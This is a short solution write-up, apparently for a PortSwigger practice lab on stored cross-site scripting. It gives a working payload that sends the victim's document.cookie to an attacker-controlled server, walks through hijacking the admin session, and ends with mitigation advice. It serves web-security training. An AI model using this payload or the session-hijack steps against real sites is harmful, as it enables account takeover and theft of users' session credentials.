# Lab 17 — Exploiting cross-site scripting to steal cookies

> **Practitioner** · [Official lab](https://portswigger.net/web-security/cross-site-scripting/exploiting-stealing-cookies)

**Entry point:** stored comment · **Goal:** exfiltrate the victim's session
cookie and use it.

## Solution

1. Note `/admin` is blocked for your account — the victim (admin) has the
   session you need.
2. Post a comment that exfiltrates `document.cookie` to your exploit server:

```html
<img src=1 onerror="fetch('https://YOUR-EXPLOIT-SERVER-URL',{
  method:'POST', mode:'no-cors', body:document.cookie})">
```

3. Deliver/await the victim's visit, then open the exploit server's
   **Access log** — it contains `secret=...; session=...`.
4. Copy the victim's cookies into your browser (devtools → storage) for the
   lab domain and load `/admin` — you are the admin — lab solved.

## Mitigation

Set `HttpOnly` on session cookies (this lab's cookies are readable by JS by
design); bind sessions to the client (IP/UA), rotate them.
